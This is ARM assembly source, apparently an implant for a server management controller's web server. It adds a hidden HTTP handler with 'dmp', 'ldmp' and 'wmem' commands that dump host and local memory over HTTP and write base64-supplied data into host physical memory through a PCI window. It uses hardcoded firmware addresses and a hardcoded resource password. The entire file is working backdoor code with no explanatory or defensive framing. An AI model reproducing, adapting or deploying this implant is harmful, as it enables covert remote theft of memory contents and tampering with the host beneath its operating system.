start:
	MOV             R12, SP
	STMFD           SP!, {R5-R11,R12,LR,PC}
	SUB             R11, R12, #4
	SUB		SP, SP, #0x400
	
	MOV             R7, R2
	MOV             R6, R3

	MOV		R1, #0x400
	MOV		R0, SP
	BL		bzero

        MOV     	R0, #8
        BL     		memmap
	
	MOV		R0, R7
	LDR		R10, get_query_string
	BLX		R10
	
	CMP             R0, #0
	BEQ		error_400

	MOV		R2, #0x100
	MOV		R1, R0
	BL		get_storage
	ADD		R0, R0, #0x2000
	STR		R0, [SP,#0xFC]
	LDR		R10, strncpy
	BLX		R10

parsing:
	MOV		R2, #0xE0
	STR		R2, [SP,#0]
	ADD		R3, SP, #0x220
	MOV		R2, #0x20
	ADD		R1, SP, #0x200
	LDR		R0, [SP,#0xFC]	
	BL		parse_qs
	STR		R0, [SP,#0xFC]

	LDR		R1, string_act
	LDR		R0, [SP, #0x200]
	CMP		R0, R1
	BNE		unknown_cmd

	LDR		R1, string_dmp
	LDR		R0, [SP, #0x220]
	CMP		R0, R1
	BEQ		cmd_dmp

	LDR		R1, string_ldmp
	LDR		R0, [SP, #0x220]
	CMP		R0, R1
	BEQ		cmd_ldmp

	LDR		R1, string_wmem
	LDR		R0, [SP, #0x220]
	CMP		R0, R1
	BEQ		cmd_wmem
	B  		unknown_cmd

cmd_dmp:
	BL 		check_host
	CMP 		R0, #1
	BNE		host_down
	LDR		R1, [SP,#0xFC]
	MOV		R0, R6
	BL 		dmp
	CMP		R0, #1
	BEQ		error_cmd
	B		end

cmd_ldmp:
	LDR		R1, [SP,#0xFC]
	MOV		R0, R6
	BL 		ldmp
	CMP		R0, #1
	BEQ		error_cmd
	B		end

cmd_wmem:
	BL 		check_host
	CMP 		R0, #1
	BNE		host_down
	LDR		R1, [SP,#0xFC]
	MOV		R0, R6
	BL 		wmem
	CMP		R0, #1
	BEQ		error_cmd
	B		end

host_down:
	MOV		R2, #0xF
	ADR		R1, string_hostdown
	MOV		R0, R6
	BL		go_200
	B		end
	
error_cmd:
	MOV		R2, #0x10
	ADR		R1, string_errcmd
	MOV		R0, R6
	BL		go_200
	B		end
	
unknown_cmd:
	MOV		R2, #0xF
	ADR		R1, string_unkcmd
	MOV		R0, R6
	BL		go_200
	B		end

error_400:
	MOV		R0, R6
	BL		go_400
	
end:	
	LDMDB           R11, {R5-R11,SP,PC}


get_query_string:	.word 0x17AD8
strncpy:		.word 0x17B26C0

bzero:
	LDR		R10, bzero_fn
	BX		R10
	
bzero_fn:		.word 0x1782FE4

string_act:		.string "act"
	.align 4
string_dmp:		.string "dmp"
	.align 4
string_ldmp:		.string "ldmp"
	.align 4
string_wmem:		.string "wmem"
	.align 4
string_cmdin:		.string "cmdin"
	.align 4
string_cmdout:		.string "cmdout"
	.align 4
string_unkcmd:		.string "Unknown command"
	.align 4
string_errcmd:		.string "Error in command"
	.align 4
string_hostdown:	.string "Host not ready!"
	.align 4
	
parse_qs:
	LDR		R10, parse_query_string
	BX		R10

parse_query_string:	.word 0x6D100

go_200_headers:
	MOV             R12, SP
	STMFD           SP!, {R5-R11,R12,LR,PC}
	SUB             R11, R12, #4

	MOV		R6, R0
	LDR             R1, off_http_code
	LDR             R2, http_code_200
	STR             R2, [R1,R6]
	MOV		R0, R6
	LDR		R10, send_headers
	BLX		R10

	LDMDB           R11, {R5-R11,SP,PC}

go_200_close:
	LDR		R10, close_conn
	BX		R10

go_200_send:
	LDR		R10, send_content
	BX		R10
	
go_200:
	MOV             R12, SP
	STMFD           SP!, {R5-R11,R12,LR,PC}
	SUB             R11, R12, #4
	SUB		SP, SP, #0x10

	MOV		R6, R0
	MOV		R7, R1
	MOV		R8, R2
	
	MOV		R0, R6
	BL		go_200_headers

	MOV		R2, R8
	MOV		R1, R7
	MOV		R0, R6
	BL		go_200_send

	MOV		R0, R6
	BL		go_200_close

	LDMDB           R11, {R5-R11,SP,PC}

go_400:
	MOV             R12, SP
	STMFD           SP!, {R5-R11,R12,LR,PC}
	SUB             R11, R12, #4

	MOV		R6, R0
	
	LDR             R1, off_http_code
	LDR             R2, http_code_400
	STR             R2, [R1,R6]

	MOV		R0, R6
	LDR 		R10, send_empty_content
	BLX		R10
	LDMDB           R11, {R5-R11,SP,PC}
	
send_content:		.word 0x16D90
send_headers:		.word 0x16BBC
close_conn:		.word 0x16DBC
send_empty_content:	.word 0x16A2C
off_http_code:		.word 0x2420
http_code_200:		.word 200
http_code_400:		.word 400

dmp:
	MOV             R12, SP
	STMFD           SP!, {R5-R11,R12,LR,PC}
	SUB             R11, R12, #4

	SUB		SP, SP, #0x400
	
	MOV		R6, R0
	MOV		R7, R1

	MOV		R1, #0x400
	MOV		R0, SP
	BL		bzero
	
	STR		R7, [SP,#0xFC]

dmp_ploop:
	LDR		R0, [SP,#0xFC]
	CMP		R0, #0
	BEQ		end_ploop
	
	MOV		R2, #0xE0
	STR		R2, [SP,#0]
	ADD		R3, SP, #0x220
	MOV		R2, #0x20
	ADD		R1, SP, #0x200
		
	BL		parse_qs
	STR		R0, [SP,#0xFC]

	BL		get_addrhistr
	LDR		R1, [SP, #0x200]
	CMP		R0, R1
	BEQ		get_addrhi

	BL		get_addrlostr
	CMP		R0, R1
	BEQ		get_addrlo

	BL		get_countstr
	CMP		R0, R1
	BNE		end_ploop

get_count:
	ADD		R0, SP, #0x220
	BL		atoi16
	STR		R0, [SP, #0xF0]
	B		dmp_ploop
get_addrhi:
	ADD		R0, SP, #0x220
	BL		atoi16
	STR		R0, [SP, #0xF8]
	B		dmp_ploop
get_addrlo:
	ADD		R0, SP, #0x220
	BL		atoi16
	STR		R0, [SP, #0xF4]
	B		dmp_ploop

end_ploop:
	LDR		R0, [SP, #0xF8]
	CMP		R0, #0
	BNE 		check_size
	LDR		R0, [SP, #0xF4]
	CMP		R0, #0
	BEQ		err_dmp
check_size:	
	LDR		R1, [SP, #0xF0]
	CMP		R1, #0
	BEQ		err_dmp
	BL		get_mask
	AND		R0, R0, R1
	CMP		R0, #0
	BNE		err_dmp

do_dmp:
	LDR		R3, [SP, #0xF0]
	LDR		R2, [SP, #0xF8]
	LDR		R1, [SP, #0xF4]
	MOV		R0, R6
	BL		dmp_host
	MOV		R0, #0
	B		end_dmp
err_dmp:
	MOV		R0, #1
end_dmp:	
	LDMDB           R11, {R5-R11,SP,PC}


ldmp:
	MOV             R12, SP
	STMFD           SP!, {R5-R11,R12,LR,PC}
	SUB             R11, R12, #4

	SUB		SP, SP, #0x400
	
	MOV		R6, R0
	MOV		R7, R1

	MOV		R1, #0x400
	MOV		R0, SP
	BL		bzero
	
	STR		R7, [SP,#0xFC]

ldmp_ploop:
	LDR		R0, [SP,#0xFC]
	CMP		R0, #0
	BEQ		end_ldmp_ploop
	
	MOV		R2, #0xE0
	STR		R2, [SP,#0]
	ADD		R3, SP, #0x220
	MOV		R2, #0x20
	ADD		R1, SP, #0x200
		
	BL		parse_qs
	STR		R0, [SP,#0xFC]

	LDR		R1, [SP, #0x200]
	BL		get_addrlostr
	CMP		R0, R1
	BEQ		get_ldmp_addrlo

	BL		get_countstr
	CMP		R0, R1
	BNE		end_ldmp_ploop

get_ldmp_count:
	ADD		R0, SP, #0x220
	BL		atoi16
	STR		R0, [SP, #0xF0]
	B		ldmp_ploop
get_ldmp_addrlo:
	ADD		R0, SP, #0x220
	BL		atoi16
	STR		R0, [SP, #0xF4]
	B		ldmp_ploop

end_ldmp_ploop:
	LDR		R0, [SP, #0xF4]
	CMP		R0, #0
	BEQ		err_ldmp
ldmp_check_size:	
	LDR		R1, [SP, #0xF0]
	CMP		R1, #0
	BEQ		err_ldmp

do_ldmp:
	MOV		R0, R6
	BL		go_200_headers

	LDR		R2, [SP, #0xF0]
	LDR		R1, [SP, #0xF4]
	MOV		R0, R6
	BL		go_200_send

	MOV		R0, R6
	BL		go_200_close
	
	MOV		R0, #0
	B		end_ldmp
err_ldmp:
	MOV		R0, #1
end_ldmp:	
	LDMDB           R11, {R5-R11,SP,PC}
	
wmem:
	MOV             R12, SP
	STMFD           SP!, {R5-R11,R12,LR,PC}
	SUB             R11, R12, #4

	SUB		SP, SP, #0x200
	
	MOV		R6, R0
	MOV		R7, R1

	MOV		R1, #0x200
	MOV		R0, SP
	BL		bzero

	STR		R7, [SP,#0xFC]

wmem_ploop:
	LDR		R0, [SP,#0xFC]
	CMP		R0, #0
	BEQ		end_wmemploop
	
	MOV		R2, #0x1000
	STR		R2, [SP,#0]
	BL		get_storage
	MOV		R3, R0
	MOV		R2, #0x20
	ADD		R1, SP, #0x100
	LDR		R0, [SP,#0xFC]	
	BL		parse_qs
	STR		R0, [SP,#0xFC]

	BL		get_addrhistr
	LDR		R1, [SP, #0x100]
	CMP		R0, R1
	BEQ		get_wmem_addrhi

	BL		get_addrlostr
	CMP		R0, R1
	BEQ		get_wmem_addrlo

	BL		get_datastr
	CMP		R0, R1
	BNE		end_wmemploop

get_data:
	MOV		R2, #0x1000
	BL		get_storage
	ADD		R1, R0, #0x1000
	BL		b64_decode
	STR		R0, [SP, #0xF0]
	B		wmem_ploop
get_wmem_addrhi:
	BL		get_storage
	BL		atoi16
	STR		R0, [SP, #0xF8]
	B		wmem_ploop
get_wmem_addrlo:
	BL		get_storage
	BL		atoi16
	STR		R0, [SP, #0xF4]
	B		wmem_ploop
	
end_wmemploop:	
	LDR		R0, [SP, #0xF8]
	CMP		R0, #0
	BNE 		check_wmem_size
	LDR		R0, [SP, #0xF4]
	CMP		R0, #0
	BEQ		err_wmem
check_wmem_size:	
	LDR		R1, [SP, #0xF0]
	CMP		R1, #0
	BEQ		err_wmem

do_wmem:
	LDR		R3, [SP, #0xF0]
	LDR		R2, [SP, #0xF8]
	LDR		R1, [SP, #0xF4]
	MOV		R0, R6
	BL		wmem_host
	MOV		R0, #0
	B 		end_wmem
err_wmem:
	MOV		R0, #1
end_wmem:	
	LDMDB           R11, {R5-R11,SP,PC}
	
get_addrhistr:	
	LDR		R0, string_addrhi
	BX		LR
string_addrhi:		.string "hiaddr"
	.align 4
get_addrlostr:	
	LDR		R0, string_addrlo
	BX		LR
string_addrlo:		.string "loaddr"
	.align 4
get_countstr:	
	LDR		R0, string_count
	BX		LR
string_count:		.string "count"
	.align 4
get_datastr:	
	LDR		R0, string_data
	BX		LR
string_data:		.string "data"
	.align 4
get_mask:
	LDR		R0, ffff
	BX		LR
ffff:			.word 0xffff

atoi16:
	MOV             R12, SP
	STMFD           SP!, {R5-R11,R12,LR,PC}
	SUB             R11, R12, #4

	MOV             R2, #0x10
	MOV             R1, #0
	LDR		R10, strtoll
	BLX		R10
	
	LDMDB           R11, {R5-R11,SP,PC}

strtoll:		.word 0x17B91F8

dmp_host:
	MOV             R12, SP
	STMFD           SP!, {R5-R11,R12,LR,PC}
	SUB             R11, R12, #4

	SUB		SP, SP, #0x100

	MOV		R6, R0
	MOV		R7, R1
	MOV		R8, R2
	MOV		R9, R3

	MOV		R1, #0x100
	MOV		R0, SP
	BL		bzero

	BL		get_passwd
	MOV		R2, R0
	BL		get_mr
	MOV		R1, R0
	MOV		R0, SP
	BL 		RequestResource
	
	ADD		R2, SP, #0x8
	ADD		R1, SP, #0x4
	LDR 		R0, [SP]
	BL		GetMemoryRegionAddresses

	MOV		R2, #0
	BL		get_saw
	MOV		R1, R0
	ADD 		R0, SP, #0x10
	BL 		RequestResource

	MOV		R0, R6
	BL		go_200_headers
		
        LDR     	R0, [SP, #0x10]
        MOV     	R2, #0
        MOV     	R1, R2
        BL	     	WaitForSemaphore

        MOV     	R0, #2
        STR     	R0, [SP, #0x14]

dmp_host_loop:
	MOV     	R3, R8, LSL #8
        ORR     	R2, R3, R7, LSR #24
        LDRB    	R3, [SP, #0x14]
	BIC     	R2, R2, #0xFF000000
        ORR     	R2, R2, R3, LSL #24
        BL		get_pcireg
        STR     	R2, [R0]
        BIC     	R2, R7, #0xFF000000
        ADD     	R0, R2, #0x81000000

	STR		R0, [SP, #0xC]

	MOV 		R3, #0x10000
	BL		get_storage
	MOV 		R2, R0
	LDR 		R1, [SP, #0xC]
	LDR 		R0, [SP]
	BL 		CopyFromMemoryRegion

	MOV		R2, #0x10000
	BL		get_storage
	MOV		R1, R0
	MOV		R0, R6
	BL		go_200_send

	SUBS		R9, R9, #0x10000
	CMP		R9, #0
	BLE		dmp_host_end

	ADD		R7, R7, #0x10000
	B 		dmp_host_loop
	
dmp_host_end:
        LDR     	R0, [SP, #0x10]
        BL     		ReleaseSemaphore
	
	MOV		R0, R6
	BL		go_200_close
	
	LDMDB           R11, {R5-R11,SP,PC}

wmem_host:
	MOV             R12, SP
	STMFD           SP!, {R5-R11,R12,LR,PC}
	SUB             R11, R12, #4

	SUB		SP, SP, #0x100

	MOV		R6, R0
	MOV		R7, R1
	MOV		R8, R2
	MOV		R9, R3

	MOV		R1, #0x100
	MOV		R0, SP
	BL		bzero

	BL		get_passwd
	MOV		R2, R0
	BL		get_mr
	MOV		R1, R0
	MOV		R0, SP
	BL 		RequestResource
	
	ADD		R2, SP, #0x8
	ADD		R1, SP, #0x4
	LDR 		R0, [SP]
	BL		GetMemoryRegionAddresses

	MOV		R2, #0
	BL		get_saw
	MOV		R1, R0
	ADD 		R0, SP, #0x10
	BL 		RequestResource

        LDR     	R0, [SP, #0x10]
        MOV     	R2, #0
        MOV     	R1, R2
        BL	     	WaitForSemaphore

        MOV     	R0, #2
        STR     	R0, [SP, #0x14]

	MOV     	R3, R8, LSL #8
        ORR     	R2, R3, R7, LSR #24
        LDRB    	R3, [SP, #0x14]
	BIC     	R2, R2, #0xFF000000
        ORR     	R2, R2, R3, LSL #24
        BL		get_pcireg
        STR     	R2, [R0]
        BIC     	R2, R7, #0xFF000000
        ADD     	R0, R2, #0x81000000

	STR		R0, [SP, #0xC]

	MOV		R3, R9
	BL		get_storage
	ADD		R2, R0, #0x1000
	LDR 		R1, [SP, #0xC]
	LDR 		R0, [SP]
	BL 		CopyToMemoryRegion

	LDR     	R0, [SP, #0x10]
        BL     		ReleaseSemaphore

	MOV		R0, R6
	BL		go_200_headers

	MOV		R2, R9
	BL		get_storage
	ADD		R1, R0, #0x1000
	MOV		R0, R6
	BL		go_200_send

	MOV		R0, R6
	BL		go_200_close

	LDMDB           R11, {R5-R11,SP,PC}

check_host:
	MOV             R12, SP
	STMFD           SP!, {R5-R11,R12,LR,PC}
	SUB             R11, R12, #4

	LDR             R2, host_pcireg
	LDR             R1, [R2]
	ANDS            R0, R1, #0x1000000
	BEQ		check_host_end

	TST             R1, #0x2000000
	MOVNE           R0, #0xFFFFFFFF
	MOVEQ           R0, #1
	
check_host_end:	
	LDMDB           R11, {R5-R11,SP,PC}
	
host_pcireg:		.word 0x1F02070
	
get_pcireg:
	LDR		R0, pcireg
	BX		LR
pcireg:			.word 0x1F02060

RequestResource:
	LDR		R10, RequestResource_fn
	BX 		R10
RequestResource_fn: 	.word 0x17A3948

WaitForSemaphore:	
	LDR		R10, WaitForSemaphore_fn
	BX 		R10
WaitForSemaphore_fn: 	.word 0x1781190

ReleaseSemaphore:	
	LDR		R10, ReleaseSemaphore_fn
	BX 		R10
ReleaseSemaphore_fn: 	.word 0x1781B54

GetMemoryRegionAddresses:
	LDR		R10, GetMemoryRegionAddresses_fn
	BX 		R10
GetMemoryRegionAddresses_fn: 	.word 0x17829A0

CopyFromMemoryRegion:
	LDR		R10, CopyFromMemoryRegion_fn
	BX 		R10
CopyFromMemoryRegion_fn: 	.word 0x178284C

CopyToMemoryRegion:
	LDR		R10, CopyToMemoryRegion_fn
	BX 		R10
CopyToMemoryRegion_fn: 		.word 0x1782818

memmap:
	LDR		R10, memmap_fn
	BX 		R10
memmap_fn:		.word 0x49718

b64_decode:
	LDR		R10, b64_decode_fn
	BX		R10
b64_decode_fn:		.word 0x1C250F8
	
get_mr:
	ADR		R0, mr
	BX		LR
mr:		.string "MR81000"
	.align 4
get_saw:
	ADR		R0, saw
	BX		LR
saw:		.string "SAWBASE"
	.align 4
get_passwd:
	ADR		R0, passwd
	BX		LR
passwd:		.string "!systempassword"
	.align 4
get_storage:
	LDR		R0, storage
	BX		LR
storage:	.word 0x2f1934
